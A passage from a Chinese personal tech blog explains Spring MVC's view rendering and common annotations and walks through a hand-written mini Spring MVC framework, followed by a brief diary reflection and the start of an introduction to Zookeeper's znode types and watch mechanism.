<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">renderMergedOutputModel</span><span class="params">(</span></span><br><span class="line"><span class="params">      Map&lt;String, Object&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Expose the model object as request attributes.</span></span><br><span class="line">   exposeModelAsRequestAttributes(model, request);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Expose helpers as request attributes, if any.</span></span><br><span class="line">   exposeHelpers(request);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Determine the path for the request dispatcher.</span></span><br><span class="line">   <span class="type">String</span> <span class="variable">dispatcherPath</span> <span class="operator">=</span> prepareForRendering(request, response);</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 得到RequestDispatcher转发器对象，这是Servlet中的API</span></span><br><span class="line">   <span class="comment">// 在最早的Servlet中我们会通过request.getRequestDispatcher().forward()转发请求</span></span><br><span class="line">   <span class="type">RequestDispatcher</span> <span class="variable">rd</span> <span class="operator">=</span> getRequestDispatcher(request, dispatcherPath);</span><br><span class="line">   ...</span><br><span class="line">   <span class="comment">// 如果调用的是RequestDispatcher的include方法</span></span><br><span class="line">   <span class="keyword">if</span> (useInclude(request, response)) &#123;</span><br><span class="line">      response.setContentType(getContentType());</span><br><span class="line">      ...</span><br><span class="line">      rd.include(request, response);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">// 如果调用的是RequestDispatcher的forward方法</span></span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">      rd.forward(request, response);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终通过RequestDispatcher转发器对象将model中的数据封装到请求中，发送给视图。</p>
<h2 id="SpringMVC常用注解"><a href="#SpringMVC常用注解" class="headerlink" title="SpringMVC常用注解"></a>SpringMVC常用注解</h2><h3 id="RequestBody和-RequestParam"><a href="#RequestBody和-RequestParam" class="headerlink" title="@RequestBody和@RequestParam"></a>@RequestBody和@RequestParam</h3><p>直接举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;liduoan&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getController</span><span class="params">(<span class="meta">@RequestParam(&quot;name&quot;)</span>String name&#123;</span></span><br><span class="line"><span class="params">    System.out.println(name)</span>;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line">                            </span><br><span class="line"><span class="meta">@RequestMapping(&quot;hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getController</span><span class="params">(<span class="meta">@RequestBody</span> String name)</span>&#123;</span><br><span class="line">    System.out.println(name);</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注解<code>@RequestBody</code>主要用来接收前端传递给后端的json字符串中的数据的(请求体中的数据的)。</p>
<p>由于GET方式无请求体，所以使用<code>@RequestBody</code>接收数据时，前端不能使用GET方式提交数据，而是用POST方式进行提交。</p>
<p>注解<code>@RequestParam</code>接收的是请求中 key-value 里面的参数（该注解中可以指定参数的名称），它会被切面进行处理从而可以用普通元素、数组、集合、对象等接收。</p>
<p>在后端的同一个接收方法里，<code>@RequestBody</code>与@<code>RequestParam</code>可以同时使用，<code>@RequestBody</code>最多只能有一个，而<code>@RequestParam</code>可以有多个。</p>
<p>更加偏向于传参的结果。</p>
<h3 id="JsonAlias和-JsonProperty"><a href="#JsonAlias和-JsonProperty" class="headerlink" title="@JsonAlias和@JsonProperty"></a>@JsonAlias和@JsonProperty</h3><p>这两个注解都是用于实体类模型的属性上，用于json字符串中参数名key和实体类中的属性名的转化。</p>
<p>注解<code>@JsonAlias</code>在json转模型时，使json中的特定key能转化为特定的模型属性；但是模型转json时，对应的转换后的key仍然与属性名一致。</p>
<p>注解<code>@JsonProperty</code>在json转模型时，使json中的特定key能转化为指定的模型属性；同样，模型转json时，对应的转换后的key为注解中指定的key。</p>
<p>另外<code>@JsonAlias</code>注解需要依赖于setter、getter，而<code>@JsonProperty</code>注解不需要。</p>
<h1 id="手写SpringMvc"><a href="#手写SpringMvc" class="headerlink" title="手写SpringMvc"></a>手写SpringMvc</h1><h2 id="DispatcherServlet的初始化"><a href="#DispatcherServlet的初始化" class="headerlink" title="DispatcherServlet的初始化"></a>DispatcherServlet的初始化</h2><p>首先我们知晓是通过<code>web.xml</code>进行<code>DispatcherServlet</code>的注册：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--配置前端控制器--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.springmvc.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--Web服务器一旦启动，Servlet就会实例化创建对象，然后初始化(预备创建对象)--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么我们关注<code>DispatcherServlet</code>，</p>
<p>首先是通过这个前端控制器完成SpringMvc的容器注册，也就是在它的初始化中完成。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1、加载初始化参数   classpath:springmvc.xml</span></span><br><span class="line">    <span class="type">String</span>  <span class="variable">contextConfigLocation</span> <span class="operator">=</span>  <span class="built_in">this</span>.getServletConfig().getInitParameter(<span class="string">&quot;contextConfigLocation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2、创建Springmvc容器</span></span><br><span class="line">    webApplicationContext = <span class="keyword">new</span> <span class="title class_">WebApplicationContext</span>(contextConfigLocation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3、进行初始化操作</span></span><br><span class="line">    webApplicationContext.onRefresh();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4、初始化请求映射关系   /findUser   ===》控制器.方法</span></span><br><span class="line">    initHandlerMapping();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是简单的获取XML文件中的数据，我们应该从<code>springmvc.xml</code>进行扫描处理</p>
<p>接着我们创建了容器，调用容器的初始化操作，<strong>最后把请求映射关系的调用链给放入Map中。</strong></p>
<p>这些都是在前端控制器的初始化阶段就完成了。</p>
<h2 id="SpringMvc容器"><a href="#SpringMvc容器" class="headerlink" title="SpringMvc容器"></a>SpringMvc容器</h2><p>我们来先分析容器的内部</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebApplicationContext</span> &#123;</span><br><span class="line">    <span class="comment">//classpath:springmvc.xml</span></span><br><span class="line">    String contextConfigLocation;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义集合  用于存放 bean 的权限名|包名.类名</span></span><br><span class="line">    List&lt;String&gt; classNameList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建Map集合用于扮演IOC容器：  key存放bean的名字   value存放bean实例</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,Object&gt; iocMap = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 初始化Spring容器</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onRefresh</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1、进行解析springmvc配置文件操作  ==》 com.baiqi.controller,com.baiqi.service</span></span><br><span class="line">         <span class="type">String</span> <span class="variable">pack</span> <span class="operator">=</span> XmlPaser.getbasePackage(contextConfigLocation.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">         String[] packs = pack.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">         <span class="comment">//2、进行包扫描</span></span><br><span class="line">         <span class="keyword">for</span>(String pa : packs)&#123;</span><br><span class="line">             excuteScanPackage(pa);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//3、实例化容器中bean</span></span><br><span class="line">        executeInstance();</span><br><span class="line"></span><br><span class="line">         <span class="comment">//4、进行 自动注入操作</span></span><br><span class="line">        executeAutoWired();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显而易见，容器完成了Bean的创建，完成了Bean的注入操作</p>
<p>在这个容器中有扫描的各个类的全限定类名集合，有Bean的Map。</p>
<p>总体流程是先通过传入的参数【也就是传入字符串<code>springmvc.xml</code></p>
<p>之后通过解析XML获得对应的包。然后扫描包，把全限定类名放入集合中</p>
<p>之后实例化被注解修饰的Bean，之后再进行注入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册Bean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeInstance</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//遍历全限定类名集合</span></span><br><span class="line">        <span class="keyword">for</span> (String className : classNameList) &#123;</span><br><span class="line">			<span class="comment">//通过全限定类名获取class</span></span><br><span class="line">            Class&lt;?&gt; clazz =   Class.forName(className);</span><br><span class="line">            <span class="comment">//判断是否为加了Controller注解</span></span><br><span class="line">            <span class="keyword">if</span>(clazz.isAnnotationPresent(Controller.class))&#123;</span><br><span class="line">                <span class="comment">//控制层 bean</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> clazz.getSimpleName().substring(<span class="number">0</span>,<span class="number">1</span>).toLowerCase()+ clazz.getSimpleName().substring(<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//按BeanName Bean 这个格式存入 Map</span></span><br><span class="line">                iocMap.put(beanName,clazz.newInstance());</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(clazz.isAnnotationPresent(Service.class))&#123;</span><br><span class="line">                <span class="comment">//Service层  bean</span></span><br><span class="line">                <span class="comment">//使用注解的value的值作为key</span></span><br><span class="line">                <span class="type">Service</span> <span class="variable">serviceAn</span> <span class="operator">=</span> clazz.getAnnotation(Service.class);</span><br><span class="line">                <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> serviceAn.value();</span><br><span class="line">                iocMap.put(beanName,clazz.newInstance());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注入</span></span><br><span class="line"><span class="comment">//进行自动注入操作</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeAutoWired</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//从容器中取出bean</span></span><br><span class="line">        <span class="comment">//然后判断 bean中是否有属性上使用 AutoWired</span></span><br><span class="line">        <span class="comment">//如果使用了搞注解，就需要进行自动注入操作</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : iocMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">//获取容器中的bean</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="comment">//获取bean中的属性</span></span><br><span class="line">            Field[] fields = bean.getClass().getDeclaredFields();</span><br><span class="line">            <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">                <span class="comment">//判断属性是否被AutoWired注解修饰了</span></span><br><span class="line">                <span class="keyword">if</span>(field.isAnnotationPresent(AutoWired.class))&#123;</span><br><span class="line">                    <span class="comment">//获取注解中的value值|该值就是bean的name</span></span><br><span class="line">                    <span class="type">AutoWired</span> <span class="variable">autoWiredAno</span> <span class="operator">=</span>  field.getAnnotation(AutoWired.class);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">beanName</span> <span class="operator">=</span> autoWiredAno.value();</span><br><span class="line">                    <span class="comment">//由于是私有属性所以需要进行取消检查</span></span><br><span class="line">                    <span class="comment">//而我们一般私有属性的赋值是使用set方法</span></span><br><span class="line">                    <span class="comment">//取消检查机制</span></span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    field.set(bean,iocMap.get(beanName));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面就完成了关于注入和注册Bean的代码。容器的使命就完成了。</p>
<p>那么我们分析下我们到上面这一步，已经有了什么？</p>
<p>1、扫描后的包中所有的类的全限定类名</p>
<p>2、被注解修饰的类已经完成了Bean的实例化</p>
<p>【– 似乎就这些 淦</p>
<p>那我们回到<code>DispatcherServlet</code>的初始化中吧，还剩下一个<code>initHandlerMapping();</code>请求映射关系初始化操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化请求映射关系</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">initHandlerMapping</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//遍历容器中的Bean</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; entry : webApplicationContext.iocMap.entrySet()) &#123;</span><br><span class="line">        <span class="comment">//获取bean的class类型</span></span><br><span class="line">        Class&lt;?&gt; clazz =  entry.getValue().getClass();</span><br><span class="line">        <span class="comment">//如果这个类被Controller注解修饰了</span></span><br><span class="line">        <span class="keyword">if</span>(clazz.isAnnotationPresent(Controller.class))&#123;</span><br><span class="line">            <span class="comment">//获取bean中所有的方法，为这些方法建立映射关系</span></span><br><span class="line">            Method[] methods =  clazz.getDeclaredMethods();</span><br><span class="line">            <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">				<span class="comment">//如果这个方法是个请求方法</span></span><br><span class="line">                <span class="keyword">if</span>(method.isAnnotationPresent(RequestMapping.class))&#123;</span><br><span class="line">                    <span class="comment">//获得注解</span></span><br><span class="line">                    <span class="type">RequestMapping</span> <span class="variable">requestMapping</span> <span class="operator">=</span> method.getAnnotation(RequestMapping.class);</span><br><span class="line">                    <span class="comment">//获取注解中的值   </span></span><br><span class="line">                    <span class="comment">//||http:localhost:8888/findUser---》  /findUser</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> requestMapping.value();</span><br><span class="line">                    <span class="comment">//建立  映射地址  与  控制器.方法</span></span><br><span class="line">                    <span class="comment">//把这个调用链和对应的类及对应的method都存入</span></span><br><span class="line">                    <span class="comment">//其实我觉得还需要把对应的参数类型给存入，不然在后面的invoke会出错</span></span><br><span class="line">                    <span class="type">MyHandler</span> <span class="variable">myHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyHandler</span>(url,entry.getValue(),method);</span><br><span class="line">                    handList.add(myHandler);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们其实大体完成了配置，再述说下我们有什么：【不是水字数啊！！</p>
<p>1、扫描后的包中所有的类的全限定类名</p>
<p>2、被注解修饰的类已经完成了Bean的实例化</p>
<p>3、调用Url的路径Handler集合，其中Handler不仅仅有URL，还有对应的Method类，方法参数等等…</p>
<h2 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h2><p>首先方法进入是<code>doPost</code>，<code>doGet</code>方法。</p>
<blockquote>
<p>其实有没有发现，只存在一个Servlt，也就是DispatcherServlet</p>
<p>所有的请求都是通过DispatcherServlet来中转的</p>
<p>由DispatcherServlet找到你调用的链，然后去执行对应的方法，最后封装返回</p>
</blockquote>
<p>好的，这两个方法其实调用的都是<code>doDispatcher</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//请求分发</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">doDispatcher</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span>&#123;</span><br><span class="line">    <span class="comment">//根据用户的请求地址  /findUser   查找Handler|Controller</span></span><br><span class="line">    <span class="type">MyHandler</span> <span class="variable">myHandler</span> <span class="operator">=</span> getHandler(req);</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(myHandler == <span class="literal">null</span>)&#123;</span><br><span class="line">            resp.getWriter().print(<span class="string">&quot;&lt;h1&gt;404 NOT  FOUND!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//调用处理方法之前 进行参数的注入</span></span><br><span class="line">            <span class="comment">//调用目标方法</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> myHandler.getMethod().invoke(myHandler.getController(),<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">//通过返回值进行处理 看时跳转还是直接返回Json</span></span><br><span class="line">            <span class="keyword">if</span>(result <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line">                <span class="comment">//跳转JSP</span></span><br><span class="line">                String viewName=(String)result;</span><br><span class="line">                <span class="comment">// forward:/success.jsp</span></span><br><span class="line">                <span class="keyword">if</span>(viewName.contains(<span class="string">&quot;:&quot;</span>))&#123;</span><br><span class="line">                    String viewType=viewName.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                    String viewPage=viewName.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">                    <span class="comment">//如果这个时forward</span></span><br><span class="line">                    <span class="keyword">if</span>(viewType.equals(<span class="string">&quot;forward&quot;</span>))&#123;</span><br><span class="line">                        req.getRequestDispatcher(viewPage).forward(req,resp);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">// redirect:/user.jsp</span></span><br><span class="line">                        resp.sendRedirect(viewPage);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//默认就转发</span></span><br><span class="line">                    req.getRequestDispatcher(viewName).forward(req,resp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//返回JSON格式数据</span></span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> myHandler.getMethod();</span><br><span class="line">                <span class="keyword">if</span>(method.isAnnotationPresent(ResponseBody.class))&#123;</span><br><span class="line">                    <span class="comment">//将返回值转换成 json格式数据</span></span><br><span class="line">                    <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> objectMapper.writeValueAsString(result);</span><br><span class="line">                    resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">                    writer.print(json);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就是分发的简略代码了。</p>
<p>所有的节奏都是由请求获取，分析请求，调用方法。</p>
<p>我们配合源码一起来看，还记得源码的节奏吗？</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/18/lTAmk1HnYbEe7Fc.jpg"
                      alt="Screenshot_86.jpg"
                ></p>
<p>也是在前端控制器完成初始化的时候，我们已经获知了对应的请求链，然后请求过来的时候，通过映射器方法，获取到对应的Handle类，这个类中封装了许多东西，比如<code>Controller</code>类的<code>class</code>文件等等。</p>
<p>之后我们通过调用适配器方法返回一个适配器，相当于给这个Handle类附加一些东西。【个人理解2021.5.20</p>
<p>至于那些前置后置方法就极度类似AOP了，这我们都知晓。</p>
<p>然后适配器调用方法，大体上就是获取参数，然后<code>invoke</code>反射搞定。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/19/V986dqthIbJD52a.jpg"
                      alt="Screenshot_87.jpg"
                ></p>
<p>最后封装视图，通过获取到对应<code>ModelAndView</code>的<code>Name</code>，我们就可以解析出该用什么<code>View</code>对象，之后通过这个<code>View</code>进行渲染操作，最后返回。</p>
<hr>
<p>今日2021年5月20日，依旧时一个人。</p>
<p>不知怎说，没有喜欢的人出现，不过似乎也的确如此。</p>
<p>但是，还是那句话勉励自己吧</p>
<p>少年少女的冒险世界无疑是充满了精彩和激情的。</p>
<p>望着窗外，此时已接近黄昏时分，暗红色的夕阳正努力挣扎在地平线上。</p>
<p>落日的余晖尽情的挥洒在整间图书馆里。</p>
<p>他拿起手中放下已久的书卷，独自一人，继续在他的世界里行进。</p>
<p>不到前方，哪里知道远方的风景是旖旎还是荒凉，是雄壮还是孤寂</p>
<p>接着走吧</p>
<p>无论前方是孤寂还是喧嚣，请继续走吧，一直</p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Zookeeper</title>
    <url>/2021/06/02/2021/Zookeeper/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Zookeeper简介"><a href="#Zookeeper简介" class="headerlink" title="Zookeeper简介"></a>Zookeeper简介</h1><p>官方文档上这么解释Zookeeper，它是一个分布式协调框架，是Apache Hadoop 的一个子项目，它主要是用来解决分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、分布式应用配置项的管理等。 比如在早期的Dubbo中，通场使用Zookeeper作为注册中心。</p>
<h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><p>官方的解释有点抽象，我们暂时可以理解为Zookeeper是一个用于存储少量数据的基于内存的数据库，主要有如下两个核心的概念：<strong>文件系统数据结构</strong> 和 <strong>监听通知机制</strong>。</p>
<h3 id="文件系统数据结构"><a href="#文件系统数据结构" class="headerlink" title="文件系统数据结构"></a>文件系统数据结构</h3><p>Zookeeper维护一个类似文件系统的树型数据结构：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/02/1ZP6j9iLYwOEVGk.jpg"
                      alt="Screenshot_92.jpg"
                ></p>
<p>每个子目录项都被称作为 **znode(目录节点)**，和文件系统类似，我们能够自由的增加、删除znode，在一个znode下增加、删除子znode。 有以下几种类型的znode：</p>
<ul>
<li><strong>PERSISTENT­持久化目录节点</strong></li>
</ul>
<p>客户端与zookeeper断开连接后，该节点依旧存在，只要不手动删除该节点，将永远存在。</p>
<ul>
<li><strong>PERSISTENT_SEQUENTIAL­持久化顺序编号目录节点</strong></li>
</ul>
<p>客户端与zookeeper断开连接后，该节点依旧存在，只是Zookeeper给该节点名称进行顺序编号。</p>
<ul>
<li><strong>EPHEMERAL­临时目录节点</strong></li>
</ul>
<p>客户端与zookeeper断开连接后，该节点被删除。</p>
<ul>
<li><strong>EPHEMERAL_SEQUENTIAL­临时顺序编号目录节点</strong></li>
</ul>
<p>客户端与zookeeper断开连接后，该节点被删除，只是Zookeeper给该节点名称进行顺序编号。</p>
<ul>
<li><strong>Container 节点</strong></li>
</ul>
<p>3.5.3 版本新增，如果Container节点下面没有子节点，则Container节点在未来会被Zookeeper自动清除，定时任务默认60s检查一次。</p>
<ul>
<li><strong>TTL 节点</strong></li>
</ul>
<p>默认禁用，只能通过配置jvm参数<code>zookeeper.extendedTypesEnabled=true</code>开启，定时节点，到期会被自动删除，但是并不准确。</p>
<blockquote>
<p>Zookeeper由java编写，很多参数只能通过jvm参数配置，配置的地方在启动脚本<code>zkServer.sh</code>中：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在ZOOMAIN中配置jvm参数</span></span><br><span class="line">ZOOMAIN=&quot;-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=$JMXLOCALONLY org.apache.zookeeper.server.quorum.QuorumPeerMain&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/06/02/B7mAyL53I62QOV8.jpg"
                      alt="Screenshot_93.jpg"
                ></p>
<h3 id="监听通知机制"><a href="#监听通知机制" class="headerlink" title="监听通知机制"></a>监听通知机制</h3><p>客户端可以向Zookeeper服务器注册监听它关心的事件，Zookeeper提供了三种监听方式:</p>
<ol>
<li>可以注册对某个节点的监听，则当这个节点被删除，或者被修改时，对应的客户端将被通知。</li>
<li>可以注册对某个目录的监听，则当这个目录有子节点被创建，或者有子节点被删除，对应的客户端将被通知。</li>
<li>可以注册某个目录的递归子节点进行监听，则当这个目录下面的任意子节点有目录结构的变化（有子节点被创建，或被删除）或者根节点有数据变化时，对应的客户端将被通知。【是每个子节点都监听 并不是向2中一样某个目录出现事件就移除。</li>
</ol>
<p>注意：<strong>所有的通知都是一次性的，及无论是对节点还是对目录进行的监听，一旦触发，对应的监听即被移除。而递归子节点，监听是对所有子节点的，所以，每个子节点下面的事件同样只会被触发一次。如果需要一直监听，则需要不断添加监听。</strong></p>
<h2 id="Zookeeper应用场景"><a href="#Zookeeper应用场景" class="headerlink" title="Zookeeper应用场景"></a>Zookeeper应用场景</h2><ol>
<li>分布式配置中心</li>
<li>分布式注册中心</li>
<li>分布式锁</li>
<li>分布式队列</li>
<li>集群选举</li>
<li>分布式屏障</li>
<li>发布&#x2F;订阅</li>
</ol>
<h1 id="Zookeeper基本使用"><a href="#Zookeeper基本使用" class="headerlink" title="Zookeeper基本使用"></a>Zookeeper基本使用</h1><h2 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装"></a>下载与安装</h2><p>Zookeeper需要java环境，首先确保至少安装了jdk8环境：</p>
